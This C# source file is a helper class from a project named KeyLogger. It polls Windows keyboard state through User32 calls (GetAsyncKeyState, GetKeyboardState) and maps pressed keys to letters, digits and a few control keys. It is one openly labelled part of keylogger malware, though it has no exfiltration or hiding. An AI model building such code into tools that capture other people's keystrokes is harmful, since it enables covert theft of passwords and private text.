using System.Runtime.InteropServices;

namespace KeyLogger.Library.Helpers
{
    public static class KeyBoardHelper
    {
        
       private const int KEYS_LENGTH = 256;

        /// <summary>
        /// Check the state of a keyboard key
        /// </summary>
        /// <param name="vKey"></param>
        /// <returns></returns>
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);

        [DllImport("User32.dll")]
        private static extern short GetKeyState(System.Int32 vKey);

        /// <summary>
        /// Check state of the whole keyboard
        /// </summary>
        /// <param name="lpKeyState"></param>
        /// <returns></returns>
        [DllImport("User32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        private static byte[] keys = new byte[KEYS_LENGTH];

        //TODO: Implement a Strategy here.
        public static char GetKeyPressed()
        {
            //int keyCode = scanKeyBoard();
            //return KeyConverter.KeyCodeToChar2(keyCode);

            return scanSelectedKeys();
        }

        //Method 1: Scan All KeyBoard
        private static int scanKeyBoard()
        {
            /**
           Notes:
           In some cases this function will always return the same array,
           independent of actual keyboard state. This is due to Windows not
           updating the virtual key array internally.It has been found that
           declaring and calling GetKeyState on any key before calling 
           GetKeyboardState will solve this issue.
           **/

            GetKeyState(10);

            int keyCode = 0;

            if (GetKeyboardState(keys))
                keyCode = getKeyCodePressedFromKeyBoardSnapshot(keys);

            return keyCode;
        }
        private static int getKeyCodePressedFromKeyBoardSnapshot(byte[] keys)
        {
            int i = 0;
            bool found = false;

            while (i < KEYS_LENGTH - 1 && !found)
            {
                if ((keys[i] & 0x80) != 0)
                {
                    found = true;
                }
                else i++;
            }

            return i;
        }

        //Method 2: Scan Key by Key (Not all keys)
        private static char scanSelectedKeys()
        {
            char c = char.MinValue;
            if (scanKey(0x41)) c = 'A';
            else if (scanKey(0x42)) c = 'B';
            else if (scanKey(0x43)) c = 'C';
            else if (scanKey(0x44)) c = 'D';
            else if (scanKey(0x45)) c = 'E';
            else if (scanKey(0x46)) c = 'F';
            else if (scanKey(0x47)) c = 'G';
            else if (scanKey(0x48)) c = 'H';
            else if (scanKey(0x49)) c = 'I';
            else if (scanKey(0x4A)) c = 'J';
            else if (scanKey(0x4B)) c = 'K';
            else if (scanKey(0x4C)) c = 'L';
            else if (scanKey(0x4D)) c = 'M';
            else if (scanKey(0x4E)) c = 'N';
            else if (scanKey(0x4F)) c = 'O';
            else if (scanKey(0x50)) c = 'P';
            else if (scanKey(0x51)) c = 'Q';
            else if (scanKey(0x52)) c = 'R';
            else if (scanKey(0x53)) c = 'S';
            else if (scanKey(0x54)) c = 'T';
            else if (scanKey(0x55)) c = 'U';
            else if (scanKey(0x56)) c = 'V';
            else if (scanKey(0x57)) c = 'W';
            else if (scanKey(0x58)) c = 'X';
            else if (scanKey(0x59)) c = 'Y';
            else if (scanKey(0x5A)) c = 'Z';
            else if (scanKey(0x30)) c = '0';
            else if (scanKey(0x31)) c = '1';
            else if (scanKey(0x32)) c = '2';
            else if (scanKey(0x33)) c = '3';
            else if (scanKey(0x34)) c = '4';
            else if (scanKey(0x35)) c = '5';
            else if (scanKey(0x36)) c = '6';
            else if (scanKey(0x37)) c = '7';
            else if (scanKey(0x38)) c = '8';
            else if (scanKey(0x39)) c = '9';
            else if (scanKey(0x10)) c = '^'; //VK_SHIFT
            else if (scanKey(0x1B)) c = (char) 0x1B; //VK_ESCAPE
            else if (scanKey(0x08)) c = ' '; //VK_BACK

            return c; 
        }
        private static bool scanKey(int keyCode)
        {
            //Applying Mask (sizeof(short) = 2bytes)
            return (GetAsyncKeyState(keyCode) & 0x8000) != 0;
        }

    }
}
